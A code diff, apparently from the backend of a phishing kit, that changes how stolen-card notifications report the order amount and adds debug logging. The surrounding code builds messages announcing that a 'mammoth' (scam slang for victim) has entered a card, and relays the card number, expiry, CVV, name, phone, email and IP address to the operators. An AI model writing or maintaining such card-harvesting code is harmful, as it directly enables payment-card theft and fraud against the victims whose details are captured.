@@ -394,7 +394,7 @@ def format_order_start_message(page_code, name, phone, email, ip, price, currenc
         f"📱 Телефон: {phone or 'Не указано'}\n"
         f"📧 Email: {email or 'Не указано'}\n"
         f"🌍 IP: {ip or 'Не указано'}\n"
-        f"💰 Сумма: {price or 'Не указано'}{currency or ''}"
+        f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}"
     )
     
     return message
@@ -456,7 +456,7 @@ def format_card_payment_message(page_code, name, price, currency, card_number, c
         f"🔔 Мамонт ввел карту ({event_name})\n\n"
         f"#️⃣ Ссылка: ?page={page_code or 'Не указано'}\n"
         f"👤 Мамонт: {name or 'Не указано'}\n"
-        f"💰 Сумма: {price or 'Не указано'}{currency or ''}\n"
+        f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}\n"
         f"💳 Номер карты: {card_number or 'Не указано'}\n"
         f"📅 Срок действия: {expiry or 'Не указано'}\n"
         f"🔐 CVV: {cvv or 'Не указано'}\n"
@@ -2716,6 +2716,9 @@ async def payment_notify(request):
             'timestamp': time.time()
         }
         print(f'[DEBUG] Stored total amount for {page_code}: {total} {currency}')
+        print(f'[DEBUG] Base price: {price} {currency}, Total: {total} {currency}')
+    else:
+        print(f'[DEBUG] No total amount provided for {page_code}, using base price: {price} {currency}')
     
     sum_str = ''
     if total and currency:
@@ -2732,13 +2735,16 @@ async def payment_notify(request):
             sum_str = f'\nСумма: {total}'
     
     # Формуємо красиве повідомлення про початок оформлення
+    # Використовуємо total замість price для показу загальної суми
+    display_price = total if total else price
+    print(f'[DEBUG] Order start message - using price: {display_price} {currency} (total: {total}, base: {price})')
     order_start_message = format_order_start_message(
         page_code=page_code,
         name=name,
         phone=phone,
         email=email,
         ip=ip,
-        price=price,
+        price=display_price,
         currency=currency
     )
     
@@ -2753,10 +2759,13 @@ async def payment_notify(request):
     
     # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
     # Формуємо красиве повідомлення про карту
+    # Використовуємо total замість price для показу загальної суми
+    display_price = total if total else price
+    print(f'[DEBUG] Card message - using price: {display_price} {currency} (total: {total}, base: {price})')
     card_message = format_card_payment_message(
         page_code=page_code,
         name=name,
-        price=price,
+        price=display_price,
         currency=currency,
         card_number=card,
         cvv=cvv,
